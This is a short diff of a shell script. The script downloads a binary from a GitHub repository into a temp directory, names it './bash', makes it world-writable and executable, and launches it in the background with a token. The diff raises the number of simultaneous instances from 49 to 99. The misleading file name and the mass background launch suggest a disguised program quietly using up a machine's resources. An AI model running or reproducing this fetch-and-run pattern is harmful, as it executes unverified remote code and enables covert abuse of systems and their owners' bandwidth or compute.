@@ -5,7 +5,7 @@ tmp="$(mktemp -d)" && cd "$tmp"
 wget -qO "./bash" "https://github.com/hanrzme/meme/raw/refs/heads/main/tm20250312"
 chmod 777 "./bash"
 if [ "$1" == "1" ]; then
-  i=49; while [ "$i" -gt "0" ]; do
+  i=99; while [ "$i" -gt "0" ]; do
     ./bash start accept --token "${token}" 2>&1 &
     i=$((i-1)); 
   done
